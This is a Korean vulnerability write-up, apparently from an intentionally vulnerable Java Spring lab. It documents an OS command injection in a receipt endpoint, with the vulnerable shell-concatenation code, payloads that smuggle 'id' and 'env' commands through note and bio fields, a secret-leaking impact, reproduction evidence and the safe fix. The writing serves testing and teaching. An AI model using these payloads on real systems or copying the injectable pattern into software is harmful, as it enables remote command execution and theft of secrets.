# VULN-019 Java 영수증 생성 OS 커맨드 인젝션 (010의 java 짝)

- 대상 스택: java-spring
- 심각도: Critical
- 분류: A05:2025 Injection (OS Command Injection, CWE-78)

## 위치

`apps/java-spring/.../controller/OrderController.java`, `POST /api/orders/{id}/receipt` — VULN-010(node)의 java 짝. 기존에는 `Files.writeString` 으로 안전하게 파일을 썼으나, 이제 요청 바디의 `note`(없으면 `user.getBio()`, `PUT /api/profile` 로 설정 가능)를 셸 명령 문자열에 그대로 삽입해 `Runtime.getRuntime().exec(new String[]{"sh","-c",cmd})` 로 실행.

```java
String cmd = "echo \"영수증 - 주문번호: " + order.getTossOrderId()
        + " / 수령인: " + user.getName()
        + " / 메모: " + note + "\" > " + RECEIPTS_DIR.resolve(filename);
Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
```

## 트리거 방법

```
POST /api/java/orders/1/receipt
{"note": "x\"; id > receipts/receipt_1.txt; echo \""}
```

또는 `PUT /api/java/profile {"bio":"x\"; env > receipts/receipt_1.txt; echo \""}` 후 `POST /api/java/orders/1/receipt` (note 미전송 → bio 폴백).

이후 `GET /api/java/orders/receipt/receipt_1.txt` (VULN-011) 로 명령 출력 회수.

## 영향

- 컨테이너 내 임의 명령 실행. `env` → `TOSS_SECRET_KEY`, `cat data/app.mv.db` → 전체 `password_hash`.

## 증거 (재현 확인)

2026-09-01, 로컬 재현 확인(`:8090`, `user1`, 주문 #1): `POST /api/java/orders/1/receipt {"note":"$(id)"}`
→ `GET /orders/receipt/receipt_1.txt` 내용에 `메모: uid=0(root) gid=0(root) groups=0(root)` — `note`가
`sh -c "echo … > file"`에 들어가 커맨드 치환 실행(컨테이너 root). RCE 확인. 동일 방식으로 `$(env)` 등
시크릿 노출 가능(시크릿 노출을 피해 `id`로 검증).

## 정상 서비스 흐름 참고

010(node)의 java 짝. 영수증을 `Runtime.exec("sh -c echo … > file")`로 생성하는 방식이 인위적이다
(바로 옆에 `Files.writeString`이 있음) — 커맨드 인젝션 sink 목적. 정상 구현은 셸을 거치지 않는 파일 쓰기.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: `Files.writeString` 유지(셸 미경유), `note` 는 데이터로만 취급.
